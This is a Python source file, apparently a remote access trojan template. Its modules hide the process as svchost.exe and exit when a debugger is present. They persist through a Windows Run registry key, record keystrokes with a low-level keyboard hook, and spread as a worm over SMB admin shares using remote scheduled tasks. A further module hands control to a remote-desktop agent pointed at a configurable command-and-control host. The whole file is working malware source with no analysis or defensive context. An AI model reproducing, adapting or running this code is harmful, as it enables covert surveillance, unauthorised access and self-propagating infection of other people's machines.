# language: Python, file: rat_template.py
import os, sys, json, time, threading, subprocess, socket, platform, random, ctypes, tempfile, shutil

CFG = json.loads("""__CFG__""")
SAFE = bool(CFG.get("safe_mode", True))
MODS = set(CFG.get("modules", []))
HOSTNAME = socket.gethostname()
LOG_FILE = os.path.join(tempfile.gettempdir(), ".log_rat.txt")

def _log(s):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f: f.write(f"[{time.strftime('%H:%M:%S')}] {s}\n")
    except Exception: pass

def anti_debug():
    if platform.system() != "Windows": return False
    try: return bool(ctypes.windll.kernel32.IsDebuggerPresent())
    except: return False

def mask_process():
    if platform.system() != "Windows": return
    try:
        k = ctypes.windll.kernel32
        n = ctypes.windll.ntdll
        k.GetCurrentThread.restype = ctypes.c_void_p
        n.NtSetInformationThread.argtypes = [ctypes.c_void_p, ctypes.c_uint, ctypes.c_void_p, ctypes.c_uint]
        n.NtSetInformationThread(k.GetCurrentThread(), 0x11, None, 0)
        k.SetConsoleTitleW("C:\\Windows\\System32\\svchost.exe")
    except: pass

def mod_persistence():
    if SAFE: return
    try:
        appdata = os.getenv("APPDATA") or tempfile.gettempdir()
        dst = os.path.join(appdata, "WinUpdater.exe")
        if os.path.abspath(sys.executable) != os.path.abspath(dst): shutil.copy(sys.executable, dst)
        subprocess.run(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WinUpdater /t REG_SZ /d "{dst}" /f', shell=True, capture_output=True)
        _log(f"persistence: {dst}")
    except Exception as e: _log(f"persistence err: {e}")

def mod_keylogger():
    if platform.system() != "Windows": return
    from ctypes import wintypes, windll, WINFUNCTYPE
    user32, kernel32 = windll.user32, windll.kernel32
    log_path = os.path.join(tempfile.gettempdir(), ".kl_test" if SAFE else ".kl")
    def cb(nCode, wParam, lParam):
        if nCode == 0 and wParam in (0x100, 0x104):
            vk = wintypes.KBDLLHOOKSTRUCT.from_address(lParam).vkCode
            with open(log_path, "a", encoding="utf-8") as f: f.write(f"{vk:02x} ")
        return user32.CallNextHookEx(None, nCode, wParam, lParam)
    HOOK = WINFUNCTYPE(ctypes.c_long, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
    hook = user32.SetWindowsHookExA(13, HOOK(cb), kernel32.GetModuleHandleW(None), 0)
    msg = wintypes.MSG()
    while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) > 0:
        user32.TranslateMessage(ctypes.byref(msg)); user32.DispatchMessageW(ctypes.byref(msg))

def mod_rdp():
    if SAFE: return
    try:
        import rdp_agent_lib
        rdp_agent_lib.run(CFG.get("c2_host", "127.0.0.1"), int(CFG.get("c2_port", 5555)))
    except Exception as e: _log(f"rdp err: {e}")

def mod_worm():
    if SAFE: return
    _log("worm started")
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
        base_ip = ".".join(local_ip.split(".")[:3])
        for i in range(1, 254):
            target = f"{base_ip}.{i}"
            if target == local_ip: continue
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(0.5)
                if s.connect_ex((target, 445)) == 0:
                    _log(f"SMB open: {target}")
                    for share in ["C$", "ADMIN$"]:
                        path = f"\\\\{target}\\{share}\\Windows\\Temp\\svchost.exe"
                        try:
                            shutil.copy(sys.executable, path)
                            subprocess.run(f'schtasks /s {target} /create /tn "SysUpdate" /tr "{path}" /sc onlogon /f', shell=True, capture_output=True)
                            break
                        except Exception: continue
            except Exception: pass
            time.sleep(5)
    except Exception as e: _log(f"worm err: {e}")

def main():
    if anti_debug() and not SAFE: sys.exit(0)
    mask_process()
    if not SAFE: time.sleep(random.randint(30, 120))
    if "persistence" in MODS: mod_persistence()
    if "keylogger" in MODS: threading.Thread(target=mod_keylogger, daemon=True).start()
    if "worm" in MODS: threading.Thread(target=mod_worm, daemon=True).start()
    if "rdp" in MODS: threading.Thread(target=mod_rdp, daemon=True).start()
    _log(f"started safe={SAFE} mods={sorted(MODS)}")
    while True: time.sleep(60)

if __name__ == "__main__":
    main()
